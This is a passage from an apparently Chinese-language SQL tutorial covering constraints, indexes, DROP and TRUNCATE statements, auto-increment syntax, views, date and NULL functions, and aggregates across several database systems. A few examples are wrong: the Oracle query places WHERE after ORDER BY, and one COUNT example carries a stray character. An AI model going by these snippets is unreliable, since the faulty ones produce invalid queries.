<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> <span class="keyword">check</span> (p_id<span class="operator">&gt;</span><span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p>2、如需命名 check 约束，并定义多个列的 check 约束，请使用下面的 sql 语法：</p>
<p>mysql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名<span class="keyword">add</span> <span class="keyword">constraint</span> chk_person<span class="operator">=</span>约束名 <span class="keyword">check</span> (p_id<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> city<span class="operator">=</span><span class="string">&#x27;sandnes&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>（3）、表已存在时，撤销约束</strong></p>
<p>1、sql server &#x2F; oracle &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名<span class="keyword">drop</span> <span class="keyword">constraint</span> chk_person<span class="operator">=</span>约束名</span><br></pre></td></tr></table></figure></div>

<p>2、mysql：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">check</span> chk_person<span class="operator">=</span>约束名</span><br></pre></td></tr></table></figure></div>

<h3 id="6、default"><a href="#6、default" class="headerlink" title="6、default"></a><strong>6、default</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">default</span> 约束用于向列中插入默认值。</span><br><span class="line">#如果没有规定其他的值，那么会将默认值添加到所有的新记录。</span><br></pre></td></tr></table></figure></div>

<p> <strong>（1）、创建表时添加约束</strong></p>
<p>1、<strong>my sql &#x2F; sql server &#x2F; oracle &#x2F; ms access：</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名</span><br><span class="line">(</span><br><span class="line">    city <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">default</span> <span class="string">&#x27;我是默认值&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>2、通过使用类似 getdate() 这样的函数，default 约束也可以用于插入系统值：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> orders</span><br><span class="line">(</span><br><span class="line">    orderdate <span class="type">date</span> <span class="keyword">default</span> getdate()</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p><strong>（2）、表已存在时，添加约束</strong></p>
<p>1、mysql：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名</span><br><span class="line"><span class="keyword">alter</span> 字段名 <span class="keyword">set</span> <span class="keyword">default</span> <span class="string">&#x27;我是默认值&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>2、sql server &#x2F; ms access：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名</span><br><span class="line"><span class="keyword">add</span> <span class="keyword">constraint</span> ab_c <span class="keyword">default</span> <span class="string">&#x27;我是默认值&#x27;</span> <span class="keyword">for</span> city</span><br></pre></td></tr></table></figure></div>

<p>3、oracle：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名</span><br><span class="line">modify 字段名 <span class="keyword">default</span> <span class="string">&#x27;我是默认值&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>（3）、表已存在时，撤销约束</strong></p>
<p><strong>1、mysql：</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名</span><br><span class="line"><span class="keyword">alter</span> 字段名 <span class="keyword">drop</span> <span class="keyword">default</span></span><br></pre></td></tr></table></figure></div>

<p><strong>2、sql server &#x2F; oracle &#x2F; ms access：</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">column</span> 字段名 <span class="keyword">drop</span> <span class="keyword">default</span></span><br></pre></td></tr></table></figure></div>

<h2 id="十、索引"><a href="#十、索引" class="headerlink" title="十、索引"></a>十、索引</h2><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">create</span> index 语句用于在表中创建索引。</span><br><span class="line">#在不读取整个表的情况下，索引使数据库应用程序可以更快地查找数据。</span><br><span class="line">#可以把索引当作新华字典的音序表，例如，要查“库”字，如果不使用音序，就需要从字典的 <span class="number">400</span> 页中逐页来找。但是，如果提取拼音出来，构成音序表，就只需要从 <span class="number">10</span> 多页的音序表中直接查找。这样就可以大大节省时间。</span><br><span class="line">#索引可以提高查询速度，但是会影响插入记录的速度。因为，向有索引的表中插入记录时，数据库系统会按照索引进行排序，这样就降低了插入记录的速度，插入大量记录时的速度影响会更加明显。这种情况下，最好的办法是先删除表中的索引，然后插入数据，插入完成后，再创建索引。</span><br></pre></td></tr></table></figure></div>

<p>1、sql create index 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#在表上创建一个简单的索引。允许使用重复的值：</span><br><span class="line"><span class="keyword">create</span> index index_name<span class="operator">=</span>索引名 <span class="keyword">on</span> 表名 (字段名)</span><br></pre></td></tr></table></figure></div>

<p>2、sql create unique index 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">#在表上创建一个唯一的索引。不允许使用重复的值：唯一的索引意味着两个行不能拥有相同的索引值。</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> index index_name<span class="operator">=</span>索引名 <span class="keyword">on</span> 表名 (字段名)</span><br><span class="line">#注释：用于创建索引的语法在不同的数据库中不一样。因此，检查您的数据库中创建索引的语法。</span><br></pre></td></tr></table></figure></div>

<p>3、create index 实例<br>（1）、下面的 sql 语句在 “persons” 表的 “lastname” 列上创建一个名为 “pindex” 的索引：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> index pindex <span class="keyword">on</span> persons (lastname)</span><br></pre></td></tr></table></figure></div>

<p>（2）、如果您希望索引不止一个列，您可以在括号中列出这些列的名称，用逗号隔开：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> index pindex <span class="keyword">on</span> persons (lastname, firstname)</span><br></pre></td></tr></table></figure></div>

<p>4、什么时候需要创建索引</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）、主键自动建立唯一索引</span><br><span class="line">（2）、频繁作为查询条件的字段应该创建索引</span><br><span class="line">（3）、查询中排序的字段创建索引将大大提高排序的速度（索引就是排序加快速查找</span><br><span class="line">（4）、查询中统计或者分组的字段；</span><br></pre></td></tr></table></figure></div>

<p>5、什么时候不需要创建索引</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）、频繁更新的字段不适合创建索引，因为每次更新不单单是更新记录，还会更新索引，保存索引文件</span><br><span class="line">（2）、where条件里用不到的字段，不创建索引；</span><br><span class="line">（3）、表记录太少，不需要创建索引；</span><br><span class="line">（4）、经常增删改的表；</span><br><span class="line">（5）、数据重复且分布平均的字段，因此为经常查询的和经常排序的字段建立索引。注意某些数据包含大量重复数据，因此他建立索引就没有太大的效果，例如性别字段，只有男女，不适合建立索引。</span><br></pre></td></tr></table></figure></div>

<h2 id="十二、删除、清空"><a href="#十二、删除、清空" class="headerlink" title="十二、删除、清空"></a>十二、删除、清空</h2><h3 id="1、删除索引"><a href="#1、删除索引" class="headerlink" title="1、删除索引"></a>1、删除索引</h3><p>1、用于 MS Access 的 DROP INDEX 语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> index 索引名称 <span class="keyword">on</span> 表名</span><br></pre></td></tr></table></figure></div>

<p>2、用于 MS SQL Server 的 DROP INDEX 语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> index 表名.索引名称</span><br></pre></td></tr></table></figure></div>

<p>3、用于 DB2&#x2F;Oracle 的 DROP INDEX 语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> index 索引名称</span><br></pre></td></tr></table></figure></div>

<p>4、用于 MySQL 的 DROP INDEX 语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> index 索引名称</span><br></pre></td></tr></table></figure></div>

<h3 id="2、删除表"><a href="#2、删除表" class="headerlink" title="2、删除表"></a>2、删除表</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 表名</span><br></pre></td></tr></table></figure></div>

<h3 id="3、删除数据库"><a href="#3、删除数据库" class="headerlink" title="3、删除数据库"></a>3、删除数据库</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> database 数据库名</span><br></pre></td></tr></table></figure></div>

<h3 id="4、清空表"><a href="#4、清空表" class="headerlink" title="4、清空表"></a>4、清空表</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> 表名</span><br></pre></td></tr></table></figure></div>

<h2 id="十三、自动递增和标识列"><a href="#十三、自动递增和标识列" class="headerlink" title="十三、自动递增和标识列"></a>十三、自动递增和标识列</h2><h4 id="1、用于-mysql-的语法"><a href="#1、用于-mysql-的语法" class="headerlink" title="1、用于 mysql 的语法"></a>1、用于 mysql 的语法</h4><p>（1）、下面的 sql 语句把 “persons” 表中的 “id” 列定义为 auto-increment 主键字段：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> persons</span><br><span class="line">(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> auto_increment</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>mysql 使用 auto_increment 关键字来执行 auto-increment 任务。<br>默认地，auto_increment 的开始值是 1，每条新记录递增 1。<br>（2）、要让 auto_increment 序列以其他的值起始，请使用下面的 sql 语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> persons auto_increment<span class="operator">=</span><span class="number">100</span></span><br></pre></td></tr></table></figure></div>

<h4 id="2、用于-sql-server-的语法"><a href="#2、用于-sql-server-的语法" class="headerlink" title="2、用于 sql server 的语法"></a>2、用于 sql server 的语法</h4><p>（1）、下面的 sql 语句把 “persons” 表中的 “id” 列定义为 auto-increment 主键字段：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> persons</span><br><span class="line">(</span><br><span class="line">id <span class="type">int</span> <span class="keyword">identity</span>(<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">primary</span> key</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>ms sql server 使用 identity 关键字来执行 auto-increment 任务。<br>在上面的实例中，identity 的开始值是 1，每条新记录递增 1。<br>提示：要规定 “id” 列以 10 起始且递增 5，请把 identity 改为 identity(10,5)。</p>
<h4 id="3、用于-access-的语法"><a href="#3、用于-access-的语法" class="headerlink" title="3、用于 access 的语法"></a>3、用于 access 的语法</h4><p>下面的 sql 语句把 “persons” 表中的 “id” 列定义为 auto-increment 主键字段：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> persons</span><br><span class="line">(</span><br><span class="line">id <span class="type">integer</span> <span class="keyword">primary</span> key autoincrement</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>ms access 使用 autoincrement 关键字来执行 auto-increment 任务。<br>默认地，autoincrement 的开始值是 1，每条新记录递增 1。<br>提示：要规定 “id” 列以 10 起始且递增 5，请把 autoincrement 改为 autoincrement(10,5)。</p>
<h4 id="4、用于-oracle-的语法"><a href="#4、用于-oracle-的语法" class="headerlink" title="4、用于 oracle 的语法"></a>4、用于 oracle 的语法</h4><p>在 oracle 中，代码稍微复杂一点。<br>您必须通过 sequence 对象（该对象生成数字序列）创建 auto-increment 字段。<br>请使用下面的 create sequence 语法：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> sequence seq_person</span><br><span class="line">minvalue <span class="number">1</span></span><br><span class="line"><span class="keyword">start</span> <span class="keyword">with</span> <span class="number">1</span></span><br><span class="line">increment <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line">cache <span class="number">10</span></span><br></pre></td></tr></table></figure></div>

<p>上面的代码创建一个名为 seq_person 的 sequence 对象，它以 1 起始且以 1 递增。该对象缓存 10 个值以提高性能。cache 选项规定了为了提高访问速度要存储多少个序列值。</p>
<h2 id="十四、视图"><a href="#十四、视图" class="headerlink" title="十四、视图"></a>十四、视图</h2><h3 id="1、创建视图"><a href="#1、创建视图" class="headerlink" title="1、创建视图"></a>1、创建视图</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> 视图名 <span class="keyword">as</span> <span class="keyword">select</span> 列名 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件</span><br></pre></td></tr></table></figure></div>

<h3 id="2、更新视图"><a href="#2、更新视图" class="headerlink" title="2、更新视图"></a>2、更新视图</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">view</span> 视图名 <span class="keyword">as</span> <span class="keyword">select</span> 列名 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件</span><br></pre></td></tr></table></figure></div>

<h3 id="3、删除视图"><a href="#3、删除视图" class="headerlink" title="3、删除视图"></a>3、删除视图</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> 视图名</span><br></pre></td></tr></table></figure></div>

<h3 id="4、更新视图"><a href="#4、更新视图" class="headerlink" title="4、更新视图"></a>4、更新视图</h3><h4 id="1、create-or-replace-view"><a href="#1、create-or-replace-view" class="headerlink" title="1、create or replace view"></a>1、create or replace view</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">view</span> view_name <span class="keyword">as</span></span><br><span class="line"><span class="keyword">select</span> column_name(s)</span><br><span class="line"><span class="keyword">from</span> table_name</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">condition</span></span><br></pre></td></tr></table></figure></div>

<h4 id="2、sql-server（更新视图）"><a href="#2、sql-server（更新视图）" class="headerlink" title="2、sql server（更新视图）"></a>2、sql server（更新视图）</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">view</span> [ schema_name . ] 视图名 [ ( <span class="keyword">column</span> [ ,...n ] ) ]</span><br><span class="line">[ <span class="keyword">with</span> <span class="operator">&lt;</span>view_attribute<span class="operator">&gt;</span> [ ,...n ] ] </span><br><span class="line"><span class="keyword">as</span> select_statement </span><br><span class="line">[ <span class="keyword">with</span> <span class="keyword">check</span> option ] [ ; ]</span><br><span class="line"><span class="operator">&lt;</span>view_attribute<span class="operator">&gt;</span> ::<span class="operator">=</span> &#123; </span><br><span class="line">  [ encryption ]</span><br><span class="line">  [ schemabinding ]</span><br><span class="line">  [ view_metadata ]   </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>schema_name: 视图所属架构的名称。</p>
<p>view_name: 要更改的视图。</p>
<p>column: 将成为指定视图的一部分的一个或多个列的名称（以逗号分隔）。</p>
<p>1、返回调用方的默认架构的名称</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name();</span><br><span class="line">go</span><br></pre></td></tr></table></figure></div>

<p> 2、使用 id 返回架构的名称</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">use 数据库名;</span><br><span class="line"><span class="keyword">select</span> schema_name(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="十五、函数"><a href="#十五、函数" class="headerlink" title="十五、函数"></a>十五、函数</h2><h3 id="1、date"><a href="#1、date" class="headerlink" title="1、date"></a>1、date</h3><h4 id="（1）、mysql-date"><a href="#（1）、mysql-date" class="headerlink" title="（1）、mysql date"></a>（1）、mysql date</h4><p>下面的表格列出了 mysql 中最重要的内建日期函数：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">now()    		<span class="operator">/</span><span class="operator">/</span>返回当前的日期和时间</span><br><span class="line">curdate() 		<span class="operator">/</span><span class="operator">/</span>返回当前的日期</span><br><span class="line">curtime() 		<span class="operator">/</span><span class="operator">/</span>返回当前的时间</span><br><span class="line"><span class="type">date</span>() 			<span class="operator">/</span><span class="operator">/</span>提取日期或日期<span class="operator">/</span>时间表达式的日期部分</span><br><span class="line"><span class="built_in">extract</span>() 		<span class="operator">/</span><span class="operator">/</span>返回日期<span class="operator">/</span>时间的单独部分</span><br><span class="line">date_add() 		<span class="operator">/</span><span class="operator">/</span>向日期添加指定的时间间隔</span><br><span class="line">date_sub() 		<span class="operator">/</span><span class="operator">/</span>从日期减去指定的时间间隔</span><br><span class="line">datediff() 		<span class="operator">/</span><span class="operator">/</span>返回两个日期之间的天数</span><br><span class="line">date_format() 	<span class="operator">/</span><span class="operator">/</span>用不同的格式显示日期<span class="operator">/</span>时间</span><br></pre></td></tr></table></figure></div>

<h4 id="（2）、sql-server-date"><a href="#（2）、sql-server-date" class="headerlink" title="（2）、sql server date"></a>（2）、sql server date</h4><p>下面的表格列出了 sql server 中最重要的内建日期函数：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">getdate() 		<span class="operator">/</span><span class="operator">/</span>返回当前的日期和时间</span><br><span class="line">datepart()		<span class="operator">/</span><span class="operator">/</span>返回日期<span class="operator">/</span>时间的单独部分</span><br><span class="line">dateadd()		<span class="operator">/</span><span class="operator">/</span>在日期中添加或减去指定的时间间隔</span><br><span class="line">datediff()		<span class="operator">/</span><span class="operator">/</span>返回两个日期之间的时间</span><br><span class="line"><span class="keyword">convert</span>()		<span class="operator">/</span><span class="operator">/</span>用不同的格式显示日期<span class="operator">/</span>时间</span><br></pre></td></tr></table></figure></div>

<p>sql date 数据类型<br>1、mysql 使用下列数据类型在数据库中存储日期或日期&#x2F;时间值：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="type">date</span> <span class="operator">-</span> 格式：		yyyy<span class="operator">-</span>mm<span class="operator">-</span>dd</span><br><span class="line">datetime <span class="operator">-</span> 格式：	yyyy<span class="operator">-</span>mm<span class="operator">-</span>dd hh:mm:ss</span><br><span class="line"><span class="type">timestamp</span> <span class="operator">-</span> 格式：	yyyy<span class="operator">-</span>mm<span class="operator">-</span>dd hh:mm:ss</span><br><span class="line"><span class="keyword">year</span> <span class="operator">-</span> 格式：		yyyy 或 yy</span><br></pre></td></tr></table></figure></div>

<p>2、sql server 使用下列数据类型在数据库中存储日期或日期&#x2F;时间值：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="type">date</span> <span class="operator">-</span> 格式：				yyyy<span class="operator">-</span>mm<span class="operator">-</span>dd</span><br><span class="line">datetime <span class="operator">-</span> 格式：			yyyy<span class="operator">-</span>mm<span class="operator">-</span>dd hh:mm:ss</span><br><span class="line">smalldatetime <span class="operator">-</span> 格式：		yyyy<span class="operator">-</span>mm<span class="operator">-</span>dd hh:mm:ss</span><br><span class="line"><span class="type">timestamp</span> <span class="operator">-</span> 格式：唯一的数字</span><br></pre></td></tr></table></figure></div>

<p>注释：当您在数据库中创建一个新表时，需要为列选择数据类型！</p>
<h3 id="2、null"><a href="#2、null" class="headerlink" title="2、null"></a>2、null</h3><p>1、查询列中带有 null 值的记录</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名 where 列名 is null</span><br></pre></td></tr></table></figure></div>

<p>2、查询列中不带有null值的记录</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 列名 from 表名 where 列名 is not null</span><br></pre></td></tr></table></figure></div>

<p>3、不同数据库判断null的函数</p>
<p>请看下面的 “products” 表：</p>
<table>
<thead>
<tr>
<th>p_id</th>
<th>productname</th>
<th>unitprice</th>
<th>unitsinstock</th>
<th>unitsonorder</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>jarlsberg</td>
<td>10.45</td>
<td>16</td>
<td>15</td>
</tr>
<tr>
<td>2</td>
<td>mascarpone</td>
<td>32.56</td>
<td>23</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>gorgonzola</td>
<td>15.67</td>
<td>9</td>
<td>20</td>
</tr>
</tbody></table>
<h3 id="3、isnull-、nvl-、ifnull-和coalesce"><a href="#3、isnull-、nvl-、ifnull-和coalesce" class="headerlink" title="3、isnull()、nvl()、ifnull()和coalesce()"></a>3、isnull()、nvl()、ifnull()和coalesce()</h3><p>微软的 isnull() 函数用于规定如何处理 null 值。</p>
<p>nvl()、ifnull() 和 coalesce() 函数也可以达到相同的结果。</p>
<p>在这里，我们希望 null 值为 0。</p>
<p>下面，如果 “unitsonorder” 是 null，则不会影响计算，因为如果值是 null 则 isnull() 返回 0：</p>
<p>1、sql server &#x2F; ms access</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> productname,unitprice<span class="operator">*</span>( unitsinstock <span class="operator">+</span> isnull(unitsonorder,<span class="number">0</span>) ) <span class="keyword">from</span> products</span><br></pre></td></tr></table></figure></div>

<p>2、oracle</p>
<p>oracle 没有 isnull() 函数。不过，我们可以使用 nvl() 函数达到相同的结果：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> productname,unitprice<span class="operator">*</span>(unitsinstock <span class="operator">+</span> nvl(unitsonorder,<span class="number">0</span>)) <span class="keyword">from</span> products</span><br></pre></td></tr></table></figure></div>

<p>3、mysql</p>
<p>mysql 也拥有类似 isnull() 的函数。不过它的工作方式与微软的 isnull() 函数有点不同。</p>
<p>在 mysql 中，我们可以使用 ifnull() 函数，如下所示：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> productname,unitprice<span class="operator">*</span>(unitsinstock<span class="operator">+</span>ifnull(unitsonorder,<span class="number">0</span>)) <span class="keyword">from</span> products</span><br></pre></td></tr></table></figure></div>

<p>或者我们可以使用 coalesce() 函数，如下所示：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> productname,unitprice<span class="operator">*</span>(unitsinstock <span class="operator">+</span> <span class="built_in">coalesce</span>(unitsonorder,<span class="number">0</span>)) <span class="keyword">from</span> products</span><br></pre></td></tr></table></figure></div>

<h3 id="4、avg"><a href="#4、avg" class="headerlink" title="4、avg()"></a>4、avg()</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>函数返回数值列的平均值。</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(列名) <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure></div>

<h3 id="5、count"><a href="#5、count" class="headerlink" title="5、count()"></a>5、count()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数返回匹配指定条件的行数</span><br></pre></td></tr></table></figure></div>

<p>1、sql count(column_name) 语法</p>
<p>count(column_name) 函数返回指定列的值的数目（null 不计入）：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<p>2、sql count(*) 语法</p>
<p>count(*) 函数返回表中的记录数：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> table_name;s</span><br></pre></td></tr></table></figure></div>

<p>3、sql count(distinct column_name) 语法</p>
<p>count(distinct column_name) 函数返回指定列的不同值的数目：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<p>注释：count(distinct) 适用于 oracle 和 microsoft sql server，但是无法用于 microsoft access。</p>
<h3 id="6、first"><a href="#6、first" class="headerlink" title="6、first()"></a>6、first()</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数返回指定的列中第一个记录的值。</span><br></pre></td></tr></table></figure></div>

<p>1、ms access first() 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">first</span>(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<p>注释：只有 ms access 支持 first() 函数。</p>
<p>2、sql server 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> table_name <span class="keyword">order</span> <span class="keyword">by</span> column_name <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure></div>

<p>3、mysql 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> table_name <span class="keyword">order</span> <span class="keyword">by</span> column_name <span class="keyword">asc</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>4、oracle 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> table_name <span class="keyword">order</span> <span class="keyword">by</span> column_name <span class="keyword">asc</span> <span class="keyword">where</span> rownum <span class="operator">&lt;=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>7、last() </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数返回指定的列中最后一个记录的值。</span><br></pre></td></tr></table></figure></div>

<p>1、ms access last() 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">last</span>(column_name) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure></div>

<p>注释：只有 ms access 支持 last() 函数。</p>
<p>2、sql server 语法</p>
